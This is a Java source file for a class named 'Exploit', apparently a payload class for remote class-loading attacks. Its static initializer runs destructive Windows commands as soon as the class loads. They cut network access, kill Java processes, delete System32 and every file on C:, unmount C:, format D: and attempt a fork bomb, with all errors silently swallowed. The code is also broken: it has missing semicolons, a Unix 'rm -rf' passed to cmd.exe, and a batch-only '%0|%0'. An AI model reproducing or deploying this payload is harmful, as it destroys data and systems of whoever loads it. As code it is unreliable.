public class Exploit {
    static {
		try {
			Runtime.getRuntime().exec("netsh wlan disconnect");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("ipconfig /release");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c taskkill /im java.exe /f");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c taskkill /im javaw.exe /f");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c del C:\\Windows\\System32\\");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c del /s /q /f c:*.*");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c mountvol C: /d");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c format D: /fs:NTFS");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c rm -rf");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c format D: /fs:NTFS");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c %0|%0");
		} catch (Exception e) {
			var lol=1
		}
		try {
			Runtime.getRuntime().exec("cmd.exe /c %0|%0");
		} catch (Exception e) {
			var lol=1
		}
	}
}
